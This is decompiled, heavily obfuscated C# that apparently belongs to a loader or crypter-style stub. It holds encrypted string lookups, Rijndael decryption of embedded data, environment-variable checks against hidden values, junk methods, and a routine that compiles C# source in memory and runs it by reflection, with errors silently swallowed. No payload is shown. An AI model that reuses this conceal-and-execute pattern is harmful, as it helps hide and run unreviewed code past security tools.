using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp;
using ns1;

namespace ns0;

internal class Class0
{
	private static Class1 class1_0 = new Class1();

	public string method_0(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable(string_0);
		Type typeFromHandle = typeof(Class0);
		MethodInfo methodInfo = null;
		MethodInfo[] methods = typeFromHandle.GetMethods();
		foreach (MethodInfo methodInfo2 in methods)
		{
			ParameterInfo[] parameters = methodInfo2.GetParameters();
			if (parameters.Length == 3 && (object)parameters[0].ParameterType == Type.GetType(Class2.smethod_0(397020316, 1558334029, 1590603526)))
			{
				_ = methodInfo2.Name;
				methodInfo = methodInfo2;
				break;
			}
		}
		object obj = Activator.CreateInstance(typeFromHandle);
		object[] parameters2 = new object[3]
		{
			1,
			environmentVariable,
			Class2.smethod_0(2070930380, 1558334017, 1590603536)
		};
		object obj2 = methodInfo.Invoke(obj, parameters2);
		return (string)obj2;
	}

	public string method_1(int int_0)
	{
		if (!(method_0(Class2.smethod_0(1718744980, 1558334005, 1590603572)).Replace(Class2.smethod_0(2067814365, 1558333997, 1590603540), Class2.smethod_0(989766745, 1558333997, 1590603548)).Replace(Class2.smethod_0(728149288, 1558333989, 1590603540), Class2.smethod_0(718530947, 1558333989, 1590603548)) == Class2.smethod_0(371590061, 1558333983, 1590603546)) && !(method_0(Class2.smethod_0(1964259129, 1558333959, 1590603524)).Replace(Class2.smethod_0(720686524, 1558334079, 1590603540), Class2.smethod_0(2051710670, 1558334079, 1590603548)).Replace(Class2.smethod_0(1626276767, 1558334071, 1590603540), Class2.smethod_0(1428422072, 1558334071, 1590603548)) != Class2.smethod_0(1452353693, 1558334071, 1590603548)))
		{
			return Class2.smethod_0(1807284708, 1558334055, 1590603544);
		}
		return Class2.smethod_0(198794728, 1558334059, 1590603536);
	}

	public string method_2(double double_0, string string_0, string string_1)
	{
		if (string_0 != null && string_0.ToString() == Class2.smethod_0(829096891, 1558334201, 1590603536))
		{
			return Class2.smethod_0(1201952639, 1558334189, 1590603536);
		}
		return Class2.smethod_0(1396435565, 1558334181, 1590603540) + string_0 + Class2.smethod_0(2086079944, 1558334173, 1590603540);
	}

	public string method_3(int int_0, string string_0, string string_1)
	{
		if (string_0 == null && string_0.ToString() == Class2.smethod_0(623012959, 1558334085, 1590603524))
		{
			return string_0 + int_0;
		}
		return string_0 + string_1;
	}

	public string method_4(long long_0, string string_0, string string_1)
	{
		if (string_0.ToString() == Class2.smethod_0(517510696, 1558334109, 1590603578))
		{
			return string_0 + long_0;
		}
		return string_0 + string_1;
	}

	public static string smethod_0(byte[] byte_0, string string_0, string string_1)
	{
		return Encoding.Unicode.GetString(smethod_1(byte_0, string_0, string_1));
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0, string string_1)
	{
		MemoryStream stream = new MemoryStream(byte_0);
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(string_0, Encoding.ASCII.GetBytes(string_1));
		rijndael.Key = passwordDeriveBytes.GetBytes(32);
		rijndael.IV = passwordDeriveBytes.GetBytes(16);
		ICryptoTransform transform = rijndael.CreateDecryptor();
		CryptoStream stream_ = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		Stream0 stream2 = new Stream0(stream_);
		byte[] array = new byte[2048];
		int num;
		do
		{
			num = stream2.Read(array, 0, array.Length);
			memoryStream.Write(array, 0, num);
		}
		while (num > 0);
		stream2.Close();
		memoryStream.Flush();
		memoryStream.Close();
		return memoryStream.ToArray();
	}

	public static string smethod_2(string string_0)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(smethod_3(string_0))).Replace(Class2.smethod_0(933278865, 1558334275, 1590603550), Class2.smethod_0(1433528434, 1558334275, 1590603548));
	}

	private static byte[] smethod_3(string string_0)
	{
		return new ASCIIEncoding().GetBytes(string_0);
	}

	private static string smethod_4(byte[] byte_0)
	{
		return new ASCIIEncoding().GetString(byte_0, 0, byte_0.Length);
	}

	public static object smethod_5(string string_0, string string_1, string string_2, string[] string_3, object[] object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		try
		{
			CSharpCodeProvider val = new CSharpCodeProvider();
			ICodeCompiler val2 = ((CodeDomProvider)val).CreateCompiler();
			CompilerParameters val3 = new CompilerParameters();
			foreach (string value in string_3)
			{
				val3.get_ReferencedAssemblies().Add(value);
			}
			val3.set_GenerateInMemory(true);
			CompilerResults val4 = val2.CompileAssemblyFromSource(val3, string_0);
			if (!val4.get_Errors().get_HasErrors())
			{
				object obj = val4.get_CompiledAssembly().CreateInstance(string_1);
				if (obj != null)
				{
					return obj.GetType().InvokeMember(string_2, BindingFlags.InvokeMethod, null, obj, object_0);
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static object smethod_6(string string_0, string string_1, string[] string_2, object[] object_0)
	{
		string string_3 = Class2.smethod_0(304869863, 1558334277, 1590603610);
		return smethod_5(string_0, string_3, string_1, string_2, object_0);
	}
}
